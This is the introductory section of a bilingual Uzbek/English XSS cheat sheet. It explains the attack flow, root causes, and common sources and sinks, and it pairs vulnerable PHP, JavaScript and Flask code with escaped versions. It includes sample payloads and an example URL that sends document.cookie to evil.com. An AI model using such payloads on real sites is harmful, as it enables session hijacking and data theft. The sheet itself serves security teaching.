# 🛡️ XSS Cheat Sheet — Cross-Site Scripting

> **Educational purposes only. Bu ma'lumotlar faqat ta'lim maqsadida.**

---

## 📚 Mundarija / Table of Contents

- [1. Kirish / Introduction](#1-kirish--introduction)
  - [XSS nima? / What is XSS?](#xss-nima--what-is-xss)
  - [Qanday ishlaydi? / How does it work?](#qanday-ishlaydi--how-does-it-work)
  - [Zaiflik sabablari / Root Causes](#zaiflik-sabablari--root-causes)

---

## 1. Kirish / **Introduction**

---

### XSS nima? / **What is XSS?**

**XSS (Cross-Site Scripting)** — bu veb-ilovadagi zaiflik bo'lib, tajovuzkor foydalanuvchi brauzerida zararli skript kodini ishga tushirishga imkon beradi.

**XSS (Cross-Site Scripting)** is a web security vulnerability that allows an attacker to inject and execute malicious scripts in a victim's browser, bypassing the same-origin policy.

```
Oddiy so'rov / Normal Request:
  Foydalanuvchi → [Veb-ilova] → Ma'lumotlar bazasi

XSS hujumi / XSS Attack:
  Tajovuzkor → [Zararli Payload] → Veb-ilova → Jabrlanuvchi brauzeri
                                                       ↓
                                              Cookie / Session o'g'irlanadi
```

---

### 🔍 Qanday ishlaydi? / **How does it work?**

XSS hujumi **3 bosqichda** amalga oshadi:

**XSS attack happens in 3 stages:**

```
┌─────────────────────────────────────────────────────────────────┐
│                     XSS HUJUM JARAYONI                          │
│                   XSS ATTACK FLOW                               │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  1️⃣  INJECTION (Kiritish / Injecting)                           │
│     Tajovuzkor → Saytga zararli input kiritadi                  │
│     Attacker  → Injects malicious input into the site           │
│                                                                 │
│         <input value="<script>alert(1)</script>">               │
│                                                                 │
│  2️⃣  STORAGE / REFLECTION (Saqlash / Aks ettirish)              │
│     Ilova inputni tekshirmay → Sahifaga chiqaradi               │
│     App renders input without sanitization → into the page      │
│                                                                 │
│         <p>Salom, <script>alert(1)</script>!</p>                │
│                                                                 │
│  3️⃣  EXECUTION (Bajarish)                                       │
│     Jabrlanuvchi sahifani ochadi → Skript brauzerda ishlaydi    │
│     Victim visits page → Script executes in their browser       │
│                                                                 │
│         👤 Victim Browser → ⚡ Malicious JS Runs                │
│                           → 🍪 Cookies stolen                   │
│                           → 🔑 Session hijacked                 │
│                           → 📤 Data exfiltrated                 │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

#### Oddiy misol / **Simple Example:**

Server-da / **On the server side:**
```php
// ❌ XAVFLI / VULNERABLE
echo "Salom, " . $_GET['name'];

// Brauzerga yetib boradi / Browser receives:
// Salom, <script>document.cookie</script>
```

Tajovuzkor URL / **Attacker's URL:**
```
https://site.com/hello?name=<script>fetch('https://evil.com?c='+document.cookie)</script>
```

---

### ⚠️ Zaiflik sabablari / **Root Causes**

XSS zaifliklarining asosiy sabablari quyidagicha tasniflangan:

**XSS vulnerabilities are caused by the following root issues:**

```
┌──────────────────────────────────────────────────────────────────────┐
│              XSS ZAIFLIK SABABLARI / ROOT CAUSES                     │
├────────────────────────┬─────────────────────────────────────────────┤
│  SABAB / CAUSE         │  IZOH / EXPLANATION                         │
├────────────────────────┼─────────────────────────────────────────────┤
│ 🚫 Input Validation    │ Foydalanuvchi kiritgan ma'lumot              │
│    yo'qligi            │ tekshirilmaydi                               │
│ No Input Validation    │ User input is not validated or filtered      │
├────────────────────────┼─────────────────────────────────────────────┤
│ 🚫 Output Encoding     │ Ma'lumot HTML sifatida chiqariladi,          │
│    yo'qligi            │ encode qilinmaydi                            │
│ No Output Encoding     │ Data is rendered as HTML without encoding    │
├────────────────────────┼─────────────────────────────────────────────┤
│ 🚫 CSP yo'qligi        │ Content Security Policy sozlanmagan          │
│ No CSP                 │ No Content Security Policy headers set       │
├────────────────────────┼─────────────────────────────────────────────┤
│ 🚫 DOM ishlov berish   │ JS orqali unsafe innerHTML / eval ishlatish  │
│ Unsafe DOM handling    │ Using innerHTML, eval() in JavaScript        │
├────────────────────────┼─────────────────────────────────────────────┤
│ 🚫 Framework noto'g'ri │ Framework xavfsizlik funksiyalari            │
│ Framework misuse       │ o'chirib qo'yilgan yoki noto'g'ri ishlatilgan│
└────────────────────────┴─────────────────────────────────────────────┘
```

#### Texnik zaiflik nuqtalari / **Vulnerable Sinks & Sources:**

```
SOURCES (Zararli ma'lumot keladigan joylar / Where attacker input enters):
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  📥 URL parameterlari     → ?search=<payload>
  📥 Form inputlari        → <input name="user">
  📥 HTTP Headerlar        → User-Agent, Referer, Cookie
  📥 JSON/API javoblari    → {"name": "<payload>"}
  📥 localStorage/Cookies  → document.cookie

SINKS (Zaiflik yuzaga keladigan joylar / Where input is unsafely used):
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  ⚡ innerHTML / outerHTML
  ⚡ document.write()
  ⚡ eval() / setTimeout(string) / setInterval(string)
  ⚡ element.src / element.href
  ⚡ jQuery: $(), .html(), .append()
```

#### Kod solishtirish / **Code Comparison:**

```javascript
// ❌ XAVFLI KOD / VULNERABLE CODE
document.getElementById("output").innerHTML = userInput;
// Tajovuzkor: userInput = "<img src=x onerror=alert(1)>"

// ✅ XAVFSIZ KOD / SAFE CODE
document.getElementById("output").textContent = userInput;
// textContent HTML teglarini string sifatida ko'rsatadi
// textContent renders HTML tags as plain text
```

```python
# ❌ XAVFLI / VULNERABLE — Flask/Python
@app.route('/hello')
def hello():
    name = request.args.get('name')
    return f"<h1>Salom, {name}!</h1>"   # To'g'ridan-to'g'ri HTML / Direct HTML injection

# ✅ XAVFSIZ / SAFE — Escape ishlatish / Using escape
from markupsafe import escape
return f"<h1>Salom, {escape(name)}!</h1>"
```

---

```
╔══════════════════════════════════════════════════════════════════╗
║              ESLATMA / REMINDER                                  ║
║                                                                  ║
║  Har doim foydalanuvchi kiritgan ma'lumotni:                     ║
║  Always treat user input as:                                     ║
║                                                                  ║
║     🔴  UNTRUSTED  —  Ishonchsiz / Never trust it                ║
║     🔵  VALIDATE   —  Tekshir / Validate on server               ║
║     🟢  ENCODE     —  Chiqishda encode qil / Encode on output    ║
╚══════════════════════════════════════════════════════════════════╝
```

---

*XSS Cheat Sheet · Section 1 of 6 · [GitHub](https://github.com)*  
*Faqat ta'lim maqsadida / For educational purposes only*
